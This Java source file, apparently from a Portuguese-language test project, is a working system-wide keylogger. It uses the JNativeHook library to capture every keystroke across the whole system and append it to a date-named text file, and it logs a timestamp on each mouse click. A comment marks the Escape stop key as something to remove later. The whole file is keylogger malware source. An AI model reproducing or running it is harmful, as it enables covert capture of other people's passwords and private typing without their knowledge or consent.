package testes;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;

public class NovoClass4 implements NativeKeyListener, NativeMouseListener {

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        GlobalScreen.addNativeKeyListener(new NovoClass4());
        GlobalScreen.addNativeMouseListener(new NovoClass4());
    }

    Date data = new Date();
    SimpleDateFormat fd = new SimpleDateFormat("dd-MM-yyyy");
    String fdd = fd.format(data);
    Date hora = new Date();
    SimpleDateFormat fh = new SimpleDateFormat("HH:mm:ss");
    String fhh = fh.format(hora);

//    public BufferedWriter Arqu() {
//        try {
//            //BufferedWriter arquivo = new BufferedWriter(new FileWriter(fdd + ".txt", true));
//            //BufferedWriter wr = new BufferedWriter(new FileWriter(new File(fdd + ".txt")));
//            PrintWriter wr = new PrintWriter(new FileWriter(fdd + ".txt", true));
//        } catch (IOException ex) {
//            System.out.println(ex.getMessage());
//        }
//        return null;
//    }

    public void nativeKeyPressed(NativeKeyEvent nke) {

        String dados = NativeKeyEvent.getKeyText(nke.getKeyCode());

        try (BufferedWriter arquivo = new BufferedWriter(new FileWriter(fdd + ".txt", true));) {
            //TIRAR ISSO AQUI EM BAIXO DEPOIS//
            if (nke.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
                try {
                    GlobalScreen.unregisterNativeHook();
                } catch (NativeHookException ex) {
                    JOptionPane.showMessageDialog(null, ex.getMessage());
                }

            } else if (nke.getKeyCode() == NativeKeyEvent.VC_ENTER) {
                arquivo.write("\n");
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SPACE) {
                arquivo.write(" ");
            } else if (true) {
                arquivo.write(dados);
                arquivo.flush();
            }
        } catch (IOException ex) {
            System.out.println(ex.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }

    ////////----------- MOUSE -----------////////
    public void nativeMouseClicked(NativeMouseEvent nme) {
        try (PrintWriter wr = new PrintWriter(new FileWriter(fdd + ".txt", true))){
            wr.println("\n");
            wr.printf(fhh);
            wr.println("\n");
            wr.flush();
        } catch (IOException ex) {
            System.out.println(ex.getMessage());
        }
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent nme) {
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent nme) {
    }

}
